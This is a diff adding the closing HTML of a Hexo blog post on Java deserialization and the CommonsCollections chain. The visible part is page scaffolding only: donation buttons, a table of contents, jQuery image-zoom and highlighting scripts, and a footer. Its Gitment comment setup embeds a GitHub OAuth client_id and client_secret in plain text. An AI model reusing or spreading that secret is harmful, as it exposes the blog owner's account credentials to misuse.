+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#触发反序列化"><span class="toc-nav-text">触发反序列化</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#反序列化过程"><span class="toc-nav-text">反序列化过程</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#CommonsCollections"><span class="toc-nav-text">CommonsCollections</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#环境"><span class="toc-nav-text">环境</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#exp"><span class="toc-nav-text">exp</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#漏洞分析"><span class="toc-nav-text">漏洞分析</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#总结"><span class="toc-nav-text">总结</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#参考链接"><span class="toc-nav-text">参考链接</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2020/02/07/Java反序列化学习之CommonsCollections/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "Java反序列化学习之反序列化流程及反射类源码分析学习",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
